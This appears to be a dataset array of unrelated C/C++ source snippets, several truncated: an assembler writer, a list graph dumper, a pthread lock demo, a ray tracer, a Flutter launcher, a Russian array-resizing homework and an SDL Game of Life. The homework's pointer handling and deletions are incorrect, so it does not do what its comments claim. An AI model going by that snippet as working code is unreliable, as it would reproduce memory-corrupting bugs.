writeValueToFile(1, address++, labels[dest]); // Write to MEMtext\n        }\n        else\n        {\n            std::cerr << \"Invalid destination label \" << dest << '\\n';\n            throw std::runtime_error(\"Invalid destination label.\");\n        }\n\n        return;\n    }\n\n    writeTokenToMEMtext(instr, address, label); // Write to MEMtext\n\n    address++;\n\n    while (iss >> instr)\n    {\n        if (instr[0] == ';')\n        {\n            break; // Comment detected, stop processing the line\n        }\n        writeTokenToMEMtext(instr, address, label); // Write to MEMtext\n        address++;\n    }\n}\n\nu_int16_t SecondPassAnalyzer::getOpcode(std::string &inst)\n{\n    if (opcodes.find(inst) == opcodes.end())\n    {\n        std::cerr << \"Invalid token \" << inst << '\\n';\n        throw std::runtime_error(\"Invalid token.\");\n    }\n    return opcodes[inst];\n}\n\nvoid SecondPassAnalyzer::writeValueToFile(u_int16_t type, u_int16_t index, u_int16_t value)\n{\n    // Convert the value to a binary string\n    std::string binaryString = std::bitset<16>(value).to_string();\n\n    // Calculate the position in the file.\n    // Note: This calculation assumes each line in the file is 16 characters long plus a newline character.\n    std::streampos pos = index * (elementSize + 1); // +1 for the newline character\n\n    switch (type)\n    {\n    case 0:\n        MEMdata->seekp(pos);\n        *MEMdata << binaryString << std::endl; // Write the binary string with a newline\n        break;\n\n    case 1:\n        MEMtext->seekp(pos);\n        *MEMtext << binaryString << std::endl; // Write the binary string with a newline\n        break;\n    }\n}\n\nvoid SecondPassAnalyzer::writeSignedConstantToMemory(u_int16_t index, int16_t value)\n{\n    // Convert the value to a binary string\n    std::string binaryString = std::bitset<16>(value).to_string();\n\n    // Calculate the position in the file.\n    // Note: This calculation assumes each line in the file is 16 characters long plus a newline character.\n    std::streampos pos = index * (elementSize + 1); // +1 for the newline character\n\n    MEMdata->seekp(pos);\n    *MEMdata << binaryString << std::endl; // Write the binary string with a newli",
    "#include \"dsl.hpp\"\n#include \"graphparams.hpp\"\n#include \"listdump.hpp\"\n\nErrorCode DumpListHTML(List* list)\n{\n\n}\n\nconst int MAX_FILENAME_LENGTH = 256;\nconst int MAX_COMMAND_LENGTH  = 256;\n\n#define dumpGraph(filename, ...) fprintf(filename, __VA_ARGS__)\n\nErrorCode DumpListGraph(List* list)\n{\n    static int DOT_DUMP_NUM = 0;\n\n    char filename[MAX_FILENAME_LENGTH] = {};\n\n    sprintf(filename, \"log/dot/result_%d.dot\", DOT_DUMP_NUM);\n\n    myOpen(filename, \"w\", graphFile);\n\n    dumpGraph(graphFile, \n                        \"  digraph\\n\"\n                        \"  {\\n\"\n                        \"  rankdir = LR;\\n\"\n                        \"  node [shape = record, color = \" NODE_FRAME_COLOR \", fontname = \" FONT_NAME \", fontsize = \" FONT_SIZE \"];\\n\"\n                        \"  bgcolor = \" BACKGROUND_COLOR \";\\n\"\n                        \"  ROOT[style = \\\"filled\\\", fillcolor = \" ROOT_COLOR \", \"\n                        \"  label = \\\"ROOT|{<head>head = %zu|<tail>tail = %zu}\\\"];\\n\"\n                        \"  FREE_HEAD[style = \\\"filled\\\", fillcolor = \" FREE_HEAD_COLOR \", \"\n                        \"  label = \\\"FREE_HEAD|<free>free = %zu\\\"];\\n\",\n                           NEXT(0), PREV(0), list->freeHead\n    );\n\n    for (size_t i = 1; i < list->capacity; i++)\n    {\n        dumpGraph(graphFile,\n                            \"  NODE_%zu[style = \\\"filled\\\", fillcolor = \" NODE_COLOR \", \"\n                            \"  label = \\\"index = %lu|value\\\\n%s|{prev = %lu|next = %lu}\\\"];\\n\",\n                            i, i, VALUE(i), PREV(i), NEXT(i)\n        );\n    }\n\n    dumpGraph(graphFile, \"ROOT\"); // TODO: show -1 in png file for better view\n\n    for (size_t i = 1; i < list->capacity; i++)\n    {\n        dumpGraph(graphFile, \"->NODE_%zu\", i);\n    }\n\n    dumpGraph(graphFile, \" [weight = 100000, color = \" BACKGROUND_COLOR \"];\\n\");\n\n    dumpGraph(graphFile, \"ROOT:head\");\n\n    size_t nodePointer = NEXT(0);\n\n    for (size_t i = 1; i < list->size; i++)\n    {\n        dumpGraph(graphFile, \"->NODE_%zu\", nodePointer);\n\n        nodePointer = NEXT(nodePointer);\n    }\n\n    dumpGraph(graphFile, \"->ROOT:tail;\\n\");\n\n    dumpGraph(graphFile, \"FREE_HEAD:free->NODE_%zu;\\n\", \n                            list->freeHead\n    );\n    \n    dumpGraph(graphFile, \"  }\\n\");\n\n    myClose(graphFile);\n\n    char command[MAX_COMMAND_LENGTH] = {};\n\n    sprintf(command, \"dot -Tpng log/dot/result_%d.dot -o log/img/result_%d.png\", DOT_DUMP_NUM, DOT_DUMP_NUM);\n\n    system(command);\n\n    DOT_DUMP_NUM++;\n\n    return OK;\n}\n\n#undef dumpGraph\n\nErrorCode PrintList(List* list)\n{\n    printf(\"physical address: \\n\");\n\n    for (size_t i = 0; i < list->capacity; i++)\n    {\n        printf(\"[%lu] -> value: %s, next: %lu, prev %lu\\n\", i, VALUE(i), NEXT(i), PREV(i));\n    }\n\n    printf(\"\\nin order:\\n\");\n\n    size_t curIndex = list->head;\n\n    for (size_t i = 0; i < list->size; i++)\n    {\n        printf(\"[%lu] -> value: %s, next: %lu, prev %lu\\n\", curIndex, VALUE(curIndex), NEXT(curIndex), PREV(curIndex));\n\n        curIndex = NEXT(curIndex);\n    }\n\n    return OK;\n}",
    "#include <iostream>\n#include <pthread.h>\n\n// \u5b9a\u4e49\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u7528\u4e8e\u5b58\u50a8\u5171\u4eab\u6570\u636e\nstruct Data {\n    int value;\n    pthread_rwlock_t lock; // \u8bfb\u5199\u9501\n};\n\n// \u8bfb\u53d6\u6570\u636e\u7684\u7ebf\u7a0b\u51fd\u6570\nvoid* reader_thread(void* arg) {\n    Data* data = static_cast<Data*>(arg);\n\n    pthread_rwlock_rdlock(&data->lock); // \u83b7\u53d6\u8bfb\u9501\n\n    std::cout << \"Reader thread: Reading value = \" << data->value << std::endl;\n\n    pthread_rwlock_unlock(&data->lock); // \u89e3\u9501\n\n    return nullptr;\n}\n\n// \u5199\u5165\u6570\u636e\u7684\u7ebf\u7a0b\u51fd\u6570\nvoid* writer_thread(void* arg) {\n    Data* data = static_cast<Data*>(arg);\n\n    pthread_rwlock_wrlock(&data->lock); // \u83b7\u53d6\u5199\u9501\n\n    data->value++; // \u4fee\u6539\u6570\u636e\n\n    std::cout << \"Writer thread: Writing value = \" << data->value << std::endl;\n\n    pthread_rwlock_unlock(&data->lock); // \u89e3\u9501\n\n    return nullptr;\n}\n\nint main() {\n    // \u521d\u59cb\u5316\u6570\u636e\u7ed3\u6784\u548c\u8bfb\u5199\u9501\n    Data data;\n    data.value = 0;\n    pthread_rwlock_init(&data.lock, nullptr);\n\n    // \u521b\u5efa\u8bfb\u53d6\u6570\u636e\u7684\u7ebf\u7a0b\n    pthread_t reader;\n    pthread_create(&reader, nullptr, reader_thread, &data);\n\n    // \u521b\u5efa\u5199\u5165\u6570\u636e\u7684\u7ebf\u7a0b\n    pthread_t writer;\n    pthread_create(&writer, nullptr, writer_thread, &data);\n\n    // \u7b49\u5f85\u7ebf\u7a0b\u7ed3\u675f\n    pthread_join(reader, nullptr);\n    pthread_join(writer, nullptr);\n\n    // \u9500\u6bc1\u8bfb\u5199\u9501\n    pthread_rwlock_destroy(&data.lock);\n\n    return 0;\n}\n\n",
    "//room depth = 240\n//room height = 350\n//room width = 300\n//(x, y, z)\n// camera bottom left = (170, 110, 0)\n// camera top left = (170, 140, 0)\n// camera top right = (130, 140, 0)\n// camera bottom right = (130, 110, 0)\n// camera rays origin = (150, 130, -20)\n\n#include <iostream>\n#include <cmath>\n#include <vector>\n#include <iterator>\n#include <fstream>\n#include <time.h>\n#include <cstdlib>\n#include <string>\n#include <limits>\n#include <chrono>\n\n#define MAXBOUNCE 15\n\n\nfloat randomFloat(){\n    return (float)((rand() % 10)/10.0f);\n}\n\nclass colour{\n    public:\n    int r;\n    int g;\n    int b;\n\n    colour(){\n        r=0;\n        g=0;\n        b=0;\n    }\n    colour(int k){\n        r=k;\n        g=k;\n        b=k;\n    }\n    colour(int i, int j, int k){\n        r=i;\n        g=j;\n        b=k;\n    }\n\n    void add(colour &clr){\n        r+=(clr.r);\n        g+=(clr.g);\n        b+=(clr.b);\n        if (r>255)\n            r=255;\n        if (g>255)\n            g=255;\n        if (b>255)\n            b=255;\n    }\n    void mult(double k){\n        double r1, g1, b1;\n        r1=r*k;\n        g1=g*k;\n        b1=b*k;\n        r=(int)r1;\n        g=(int)g1;\n        b=(int)b1;\n    }\n    void mult(int i, int j, int k){\n        int r1, g1, b1;\n        r1=r*i;\n        g1=g*j;\n        b1=b*k;\n        r=(int)floor(r1/255);\n        g=(int)floor(g1/255);\n        b=(int)floor(b1/255);\n    }\n    void mult(colour &clr){\n        int r1, g1, b1;\n        r1=r*(clr.r);\n        g1=g*(clr.g);\n        b1=b*(clr.b);\n        r=(int)floor(r1/255);\n        g=(int)floor(g1/255);\n        b=(int)floor(b1/255);\n    }\n};\n\nclass vect{\n    public:\n    double x, y, z;\n\n    vect(){\n        x=0;\n        y=0;\n        z=0;\n    }\n    vect(double k){\n        x=k;\n        y=k;\n        z=k;\n    }\n    vect(double i, double j, double k){\n        x=i;\n        y=j;\n        z=k;\n    }\n\n    \n    double length2(){ \n        return (x * x) + (y * y) + (z * z); \n    }\n    double length(){ \n        return sqrt(length2()); \n    }\n    \n};\n\nvect operator-(const vect& a, const vect& b) {\n    return vect(a.x - b.x, a.y - b.y, a.z - b.z);\n}\n\nvect operator-(const vect& a) {\n    return vect(-a.x, -a.y, -a.z);\n}\n\nvect operator+(const vect& a, const vect& b) {\n    return vect(a.x + b.x, a.y + b.y, a.z + b.z);\n}\n\nvoid operator*=(vect& v, double c) {\n    v.x *= c;\n    v.y *= c;\n    v.z *= c;\n}\n\nvect operator*(const vect& v, double c) {\n    return vect(v.x * c, v.y * c, v.z * c);\n}\n\nvoid normalize(vect& a) {\n    double nor2 = a.length2();\n    if (nor2 > 0) {\n        double invNor = 1 / sqrt(nor2);\n        a *= invNor;\n    }\n}\n\ndouble dot(vect &a, vect &b){\n    double i = (a.x) * (b.x);\n    double j = (a.y) * (b.y);\n    double k = (a.z) * (b.z);\n    return i+j+k;\n}\n\nvect cross(vect &a, vect &b){\n    double i = (a.y * b.z) - (b.y * a.z);\n    double j = (b.x * a.z) - (a.x * b.z);\n    double k = (a.x * b.y) - (b.x * a.y);\n    return vect(i, j, k);\n}\n\nvect getRandDir(){\n    vect rand(randomFloat(), randomFloat(), randomFloat());\n    // normalize(rand);\n    return rand;\n}\n\nclass Sphere{\n    public:\n    vect center;\n    double radius;\n    double radius2;\n    float refl; //between 0 and 1\n    float rough;\n    colour clr;\n    float transparency; // between 0 and 1\n    float refr_index;\n    bool light;\n\n    Sphere(const vect& c, double r, float refl, float rog, colour col, float transp, float refr, bool lig) : \n        center(c), \n        radius(r), \n        refl(refl),\n        rough(rog), \n        clr(col), \n        transparency(transp),\n        refr_index(refr),\n        light(lig){\n        radius2 = r * r;\n    }\n    Sphere(const vect& c, double r, float refl, float rog, colour col, float transp, bool lig) : \n        center(c), \n        radius(r), \n        refl(refl),\n        rough(rog), \n        clr(col), \n        transparency(transp),\n        light(lig){\n        radius2 = r * r;\n        refr_index=1.0;\n    }\n    Sphere(const vect& c, double r, float refl, float rog, colour col, bool lig) : \n        center(c), \n        radius(r), \n        refl(refl),\n        rough(rog), \n        clr(col), \n        light(lig){\n        radius2 = r * r;\n        transparency=0.0;\n        refr_index=1.0;\n    }\n\n    bool intersect(vect& rayorig, vect& raydir, double& t0, double& t1){\n        vect l = center - rayorig;\n        double tca = dot(l, raydir);\n        if (tca < 0) return false;\n\n        double d2 = l.length2() - (tca * tca);\n        if (d2 > radius2) return false;\n\n        double thc = sqrt(radius2 - d2);\n\n        t0 = tca - thc;\n        t1 = tca + thc;\n        return true;\n    }\n\n    vect reflect(vect& raydir, vect& normal) {\n        double mult = 2 * dot(raydir, normal);\n        vect reflectedDir = raydir - (normal * mult);\n        reflectedDir = reflectedDir + (getRandDir()*rough);\n        return reflectedDir;\n    }\n\n    vect refract(vect& raydir, vect& normal, bool enteringMedium){\n        double n = enteringMedium ? 1.0 / refr_index : refr_index;\n\n        normalize(normal);\n        normalize(raydir);\n\n        double c",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bmi_modern\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff// Homework_17.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\nvoid showArray(int*** ar, int rows, int columns); //\u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u043c\u0430\u0441\u0441\u0438\u0432\nvoid addRow(int*** ar, int rows, int columns);//\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0442\u0440\u043e\u043a\u0443\nvoid deleteRow(int*** ar, int rows, int columns);//\u0443\u0434\u0430\u043b\u0438\u0442\u044c \u0441\u0442\u0440\u043e\u043a\u0443\nvoid addColumn(int*** ar, int rows, int columns); //\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0442\u043e\u043b\u0431\u0435\u0446\nvoid deleteColumn(int*** ar, int rows, int columns); //\u0443\u0434\u0430\u043b\u0438\u0442\u044c \u0441\u0442\u043e\u043b\u0431\u0435\u0446\n\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n    //\u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c 4 \u0444\u0443\u043d\u043a\u0446\u0438\u0438:\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 1. \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u043a\u043e\u043d\u0435\u0446 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430. \u041d\u043e\u0432\u044b\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0440\u0430\u0432\u043d\u044b 0.\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 2. \u0423\u0434\u0430\u043b\u044f\u0435\u0442 \u0441\u0442\u0440\u043e\u043a\u0443 \u0441 \u043a\u043e\u043d\u0446\u0430 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430.\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 3. \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u0441\u0442\u043e\u043b\u0431\u0435\u0446 \u0432 \u043a\u043e\u043d\u0435\u0446 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430. \u041d\u043e\u0432\u044b\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0440\u0430\u0432\u043d\u044b 0.\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 4. \u0423\u0434\u0430\u043b\u044f\u0435\u0442 \u0441\u0442\u043e\u043b\u0431\u0435\u0446 \u0441 \u043a\u043e\u043d\u0446\u0430 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430.\n\n\n    unsigned int rows = 3;       // \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0442\u0440\u043e\u043a\n    unsigned int columns = 2;    // \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432\n    \n    int** ar = new int* [rows]; // \u0432\u044b\u0434\u0435\u043b\u044f\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u043f\u043e\u0434 \u0434\u0432\u0443\u0445\u043c\u0435\u0440\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432\n    for (int y = 0; y < rows; y++) {\n        ar[y] = new int[columns];\n        for (int x = 0; x < columns; x++) {\n            ar[y][x] = rand() % 100;\n            cout << ar[y][x] << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n    addRow(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n    \n    deleteRow(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n\n    addColumn(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n    \n    deleteColumn(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n    \n    for (int y = 0; y < rows; y++)\n        delete[]ar[y];\n    delete[]ar;\n    \n}\n\n\nvoid showArray(int*** ar, int rows, int columns) {\n    for (int y = 0; y < rows; y++) {\n        for (int x = 0; x < columns; x++) {\n            (*ar[y][x]) = rand() % 100;\n            cout << (*ar[y][x]) << \"\\t\";\n        }\n    }\n}\n\nvoid addRow(int*** ar, int rows, int columns) {\n    \n    for (int y = 0; y < rows+1; y++) {\n        for (int x = 0; x < columns; x++) {\n            (*ar[y][x]) = 0;\n            cout << (*ar[y][x]) << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n}\n\nvoid deleteRow(int*** ar, int rows, int columns) { \n\n    for (int y = rows; y > 0; y--) {\n        delete[] ar[y];\n        cout << \"\\n\\n\";\n    }\n}\n\nvoid addColumn(int*** ar, int rows, int columns) {\n\n    for (int y = 0; y < rows; y++) {\n        for (int x = 0; x < columns+1; x++) {\n            (*ar[y][x]) = 0;\n            cout << (*ar[y][x]) << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n}\n\nvoid deleteColumn(int*** ar, int rows, int columns) {\n    for (int y = 0; y < rows; y++) {\n        for (int x = columns; x > 0; x--) {\n            delete[] ar[y][x];\n            cout << \"\\n\\n\";\n        }\n    }\n}\n\n// \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. \u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
    "/*\r\n* Created by Zaine Rehman\r\n* 3/24/2024 - 4/1/2024\r\n* \r\n* the game of life!\r\n* \r\n* \r\n* CONTROLS (buttons are on keypad):\r\n* \r\n* [left mouse] - place/remove pixel\r\n* [right mouse] - drag place/remove pixel\r\n* \r\n* [/] - increase frame delay\r\n* [*] - decrease frame delay\r\n* [.] - set frame delay to 0\r\n* \r\n* [-] - fill screen with random pixels, 50% filled\r\n* [+] - fill screen with random pixels, 25% filled\r\n* \r\n* [1] - small pixel size\r\n* [2] - medium pixel size\r\n* [3] - large pixel size\r\n* \r\n* [4] - standard game logic\r\n* [5] - game logic tweaked for more growth\r\n* [6] - game logic tweaked for less growth\r\n* \r\n* [7] - black and white colors\r\n* [8] - color scheme 1\r\n* [9] - color scheme 2\r\n* \r\n* [0] - clear screen\r\n* \r\n* [enter] - pause\r\n* \r\n* \r\n* \r\n* yes, its supposed to have threading. \r\n* no, there is not threading. \r\n*/\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <thread>\r\n#include <chrono>\r\n#include <cmath>\r\n\r\n#include <SDL.h>\r\n#undef main\r\n\r\n#include \"render.hpp\"\r\n\r\n#define loop(x) for (uint32_t i = 0; i < x; ++i)\r\n\r\nconstexpr uint32_t SCREENWIDTH = 1000;\r\nconstexpr uint32_t SCREENHEIGHT = 1000;\r\nuint16_t SCALEFACTOR = 1; // pixels per cell = scaleFactor^2, width and height must be divisible by this\r\nint32_t DELAY = 100; // ms\r\nuint16_t THREADS = 1;\r\nuint8_t COLORMODE = 1;\r\nuint8_t GAMELOGIC = 0; // 0 = cgol\r\n\r\nstd::vector<std::vector<bool>> PIXELS (SCREENHEIGHT/SCALEFACTOR,std::vector<bool>(SCREENWIDTH/SCALEFACTOR,false));\r\n\r\nbool QUIT = false;\r\nbool EDITING = true;\r\nSDL_Surface* SURFACE;\r\nSDL_Window* WINDOW;\r\nSDL_Event event;\r\nRenderer renderer;\r\nRGBA_t display[SCREENHEIGHT][SCREENWIDTH];\r\nint mouseX, mouseY;\r\nuint8_t rightMode = 0;\r\n\r\n/*\r\n\t1 - 3rd color mode\r\n\t2 - fill screen with random pixels\r\n\t3 - alternate game logic\r\n4 - make mouse work in non edit mode??\r\n*/\r\n\r\nvoid getNewPixels(\r\n\tconst std::vector<std::vector<bool>>& oldPixels, \r\n\tstd::vector<std::vector<bool>>& returnTo, \r\n\tuint32_t from, \r\n\tuint32_t to\r\n) {\r\n\tstd::vector<std::vector<bool>> newPixels (SCREENHEIGHT/SCALEFACTOR,std::vector<bool>(SCREENWIDTH/SCALEFACTOR,false));\r\n\t//std::cout << \"going vertically from \" << from << \" to \" << to << '\\n';\r\n\r\n\tfor (uint32_t i = from; i < to; ++i) {\r\n\t\tfor (uint32_t x = 0; x < SCREENWIDTH/SCALEFACTOR; ++x) {\r\n\r\n\t\t\tswitch (GAMELOGIC) {\r\n\t\t\t// traditional cgol\r\n\t\t\tcase 0: {\r\n\t\t\t\tuint8_t neighborsAlive = 0;\r\n\t\t\t\tif (i > 0) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i-1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i-1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i-1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif (i < SCREENHEIGHT/SCALEFACTOR-1) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i+1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i+1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i+1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif ((x > 0) && (oldPixels[i][x-1])) neighborsAlive++;\r\n\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i][x+1])) neighborsAlive++;\r\n\r\n\t\t\t\tnewPixels[i][x] = true;\r\n\t\t\t\tif (oldPixels[i][x] && !((neighborsAlive == 2) || (neighborsAlive == 3))) newPixels[i][x] = false;\r\n\t\t\t\telse if (!oldPixels[i][x] && !(neighborsAlive == 3)) newPixels[i][x] = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t// pixels become alive from dead at 2 or 3 neighbors\r\n\t\t\t// but alive pixels only survive at 2\r\n\t\t\tcase 1: {\r\n\t\t\t\tuint8_t neighborsAlive = 0;\r\n\t\t\t\tif (i > 0) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i-1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i-1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i-1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif (i < SCREENHEIGHT/SCALEFACTOR-1) 